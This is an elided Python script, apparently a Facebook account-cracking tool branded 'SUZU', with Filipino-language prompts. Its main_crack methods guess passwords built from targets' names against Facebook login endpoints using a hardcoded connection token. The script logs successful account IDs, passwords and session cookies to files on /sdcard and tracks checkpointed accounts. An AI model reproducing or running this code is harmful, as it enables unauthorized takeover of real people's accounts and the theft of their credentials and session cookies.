...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print("××××××××××××××××××××××××××××××××××")
        input("Press enter to back SUZU Menu ")
        exit()
...
def mogid():   
    ...
    print(f'[W] Join Messenger Burat')
    ...
    if select =='1':
        ...
        os.system('xdg-open https://www.facebook.com/ynii.syyy')
        pass
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/ynii.syyy')
    else:
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SUZU] {loop} | S1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [SUZU-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SUZU_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SUZU_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [MKT-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SUZU_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SUZU] {loop} | S3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [SUZU-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SUZU_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SUZU_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [MKT-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[SUZU] {loop} | S4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [SUZU-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SUZU_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(f'{S} Cracking Started Maghintay ka >>')
            print("××××××××××××××××××××××××××××××××××")
